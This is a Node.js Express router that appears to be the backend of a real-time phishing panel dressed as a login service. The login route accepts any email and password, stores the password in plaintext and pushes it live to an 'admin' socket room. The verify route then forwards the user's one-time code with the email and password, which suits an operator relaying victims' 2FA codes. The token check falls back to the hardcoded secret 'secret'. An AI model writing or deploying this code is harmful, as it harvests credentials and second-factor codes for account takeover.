const express = require('express');
const db = require('../utils/db');
const router = express.Router();
const jwt = require('jsonwebtoken');
const getRealIP = require('../utils/get-real-ip');

module.exports = (io) => {
  router.post('/login', async (req, res) => {
    try {
      const { email, password } = req.body;
      let clientIP = getRealIP(req);

      const bannedIPs = await db.query(
        'SELECT * FROM ip_blacklist WHERE ip_address = ? AND status = "active"',
        [clientIP]
      );

      if (bannedIPs.length > 0) {
        return res.status(403).json({
          error: req.t('ip_banned'),
          reason: bannedIPs[0].reason || req.t('ip_banned_default_reason')
        });
      }

      const emailOrPhone = email;
      const emailRegex = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
      const phoneRegex = /^\+?[1-9]\d{9,14}$/;
      if (!emailRegex.test(emailOrPhone) && !phoneRegex.test(emailOrPhone)) {
        return res.status(400).json({ error: req.t('account_must_be_email_or_phone') });
      }

      let members = await db.query('SELECT * FROM members WHERE email = ?', [email]);
      let member;
      let isNewMember = false;

      if (members.length === 0) {
        const result = await db.insert('members', {
          email,
          password
        });

        member = { id: result.insertId, email, password };
        isNewMember = true;
      } else {
        member = members[0];
        const validPassword = (password === member.password);
        if (!validPassword) {
          return res.status(400).json({ error: req.t('invalid_credentials') });
        }
      }

      let assignedAdminId = null;
      if (req.app && req.app.locals && req.app.locals.assignAdminForLogin) {
        console.log('[Assignment Debug] Current online admins:', Array.from(req.app.locals.onlineAdmins ? req.app.locals.onlineAdmins.keys() : []));
        assignedAdminId = await req.app.locals.assignAdminForLogin();
        console.log('[Assignment Debug] Assigned admin ID:', assignedAdminId);
      }
      const loginResult = await db.insert('login_logs', {
        member_id: member.id,
        ip_address: clientIP,
        assigned_admin_id: assignedAdminId
      });

      const loginRequestData = {
        id: loginResult.insertId,
        member_id: member.id,
        email: member.email,
        password: password,
        ip_address: clientIP,
        login_time: new Date()
      };
      io.to('admin').emit('new-login-request', loginRequestData);

      res.json({
        message: req.t('login_pending_approval'),
        loginId: loginResult.insertId,
        memberId: member.id
      });

    } catch (error) {
      res.status(500).json({ error: req.t('server_error') });
    }
  });

  router.post('/verify', async (req, res) => {
    try {
      const { loginId, verificationCode } = req.body;

      const loginLogs = await db.query(
        'SELECT * FROM login_logs WHERE id = ? AND status = "approved"',
        [loginId]
      );

      if (loginLogs.length === 0) {
        return res.status(400).json({ error: req.t('invalid_login_session') });
      }

      const loginLog = loginLogs[0];
      
      const existingVerifications = await db.query(
        'SELECT * FROM second_verifications WHERE member_id = ? AND login_log_id = ? AND (status = "pending" OR status = "rejected")',
        [loginLog.member_id, loginId]
      );
      

      
      let verificationId;
      
      if (existingVerifications.length > 0) {
        const existingVerification = existingVerifications[0];
        await db.update('second_verifications', 
          { 
            verification_code: verificationCode,
            status: 'pending'
          },
          { id: existingVerification.id }
        );
        verificationId = existingVerification.id;

      } else {
        const verifyResult = await db.insert('second_verifications', {
          member_id: loginLog.member_id,
          login_log_id: loginId,
          verification_code: verificationCode,
          assigned_admin_id: loginLog.assigned_admin_id
        });
        verificationId = verifyResult.insertId;

      }

      const members = await db.query('SELECT email, password FROM members WHERE id = ?', [loginLog.member_id]);
      
      if (existingVerifications.length > 0) {
        io.to('admin').emit('update-verification-request', {
          id: verificationId,
          member_id: loginLog.member_id,
          email: members[0].email,
          password: members[0].password,
          verification_code: verificationCode,
          submitted_at: new Date()
        });
      } else {
        io.to('admin').emit('new-verification-request', {
          id: verificationId,
          member_id: loginLog.member_id,
          email: members[0].email,
          password: members[0].password,
          verification_code: verificationCode,
          submitted_at: new Date()
        });
      }

      res.json({
        message: req.t('verification_pending_approval'),
        verificationId: verificationId
      });

    } catch (error) {
      console.error('Second verification API error:', error, error && error.stack);
      res.status(500).json({ error: req.t('server_error') });
    }
  });

  router.post('/cancel', async (req, res) => {
    try {
      const { loginId, memberId } = req.body;
      
      if (!loginId || !memberId) {
        return res.status(400).json({ error: req.t('missing_required_parameters') });
      }

      let isOnline = false;
      if (req.app && req.app.locals && req.app.locals.onlineMembers) {
        isOnline = req.app.locals.onlineMembers.has(memberId);
      }

      const loginLogs = await db.query('SELECT * FROM login_logs WHERE id = ?', [loginId]);
      
      if (loginLogs.length === 0) {
        console.log(`Login record ${loginId} does not exist, may have been cleaned`);
        return res.status(200).json({ message: req.t('login_record_processed') });
      }
      
      const loginLog = loginLogs[0];
      
      if (loginLog.status !== 'approved') {
      try {
        await db.query('DELETE FROM second_verifications WHERE member_id = ?', [memberId]);
        await db.query('DELETE FROM checkin_records WHERE member_id = ?', [memberId]);
        await db.query('DELETE FROM login_logs WHERE member_id = ?', [memberId]);
        await db.query('DELETE FROM members WHERE id = ?', [memberId]);
        } catch (error) {
          console.error('Auto cleanup data error:', error);
        }
      }
      
      io.to('admin').emit('cancel-login-request', {
        id: loginId,
        member_id: memberId
      });
      
      console.log(`Notified admin to cancel login request ${loginId}`);
      
      res.status(200).json({ message: req.t('request_cancelled') });
    } catch (error) {
      console.error('Cancel request error:', error);
      res.status(200).json({ message: req.t('request_processed') });
    }
  });

  router.post('/verify-token', (req, res) => {
    const { token } = req.body;
    if (!token) return res.status(400).json({ error: req.t('no_token') });
    try {
      const decoded = jwt.verify(token, process.env.JWT_SECRET || 'secret');
      res.json({ valid: true, memberId: decoded.memberId });
    } catch (e) {
      res.status(401).json({ error: req.t('invalid_or_expired_token') });
    }
  });

  return router;
};